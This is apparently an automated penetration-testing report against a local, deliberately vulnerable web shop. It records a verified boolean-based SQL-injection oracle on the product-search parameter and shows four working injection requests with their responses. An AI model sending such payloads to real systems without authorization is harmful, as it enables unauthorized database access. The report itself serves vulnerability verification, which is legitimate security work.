# L3 Proven Real Impact — http://localhost:3100
run `run-63bd3691f3` — layer sentinel-impact/4.4.0

- impacts: 1 total / **1 VERIFIED** / 0 INFERRED / 0 PROBE_FAILED / 0 NOT_SAFE_TO_PROVE / 0 REFUSED
- safety ceiling: capability proven, not exploited — أُثبتت القدرة، لم تُستغَل

## sql_version_oracle — VERIFIED
- path `L3P-f3165d6312` findings ['F-60b534f835'] — sql_version_oracle at /rest/products/search (param q) — minimal benign proof
- detail: `{"control_true_size": 21571, "control_false_size": 30, "version_true_size": 21571, "version_false_size": 30, "version_char": null, "digit_probes": {"version_digit_5": 30, "version_digit_8": 30}}`
- evidence [probe] pr-0001: '{"status":"success","data":[{"id":1,"name":"Apple Juice (100'
  - probe: GET http://localhost:3100/rest/products/search?q=1%27%29%29+OR+1%3D1-- body=''
  - response: status 200 body='{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-t'
- evidence [probe] pr-0002: '{"status":"success","data":[]}'
  - probe: GET http://localhost:3100/rest/products/search?q=1%27%29%29+OR+1%3D2-- body=''
  - response: status 200 body='{"status":"success","data":[]}'
- evidence [probe] pr-0003: '{"status":"success","data":[{"id":1,"name":"Apple Juice (100'
  - probe: GET http://localhost:3100/rest/products/search?q=1%27%29%29+OR+sqlite_version%28%29+LIKE+%27%25%27-- body=''
  - response: status 200 body='{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-t'
- evidence [probe] pr-0004: '{"status":"success","data":[]}'
  - probe: GET http://localhost:3100/rest/products/search?q=1%27%29%29+OR+sqlite_version%28%29+LIKE+%27zzz-sentinel-nope%25%27-- body=''
  - response: status 200 body='{"status":"success","data":[]}'

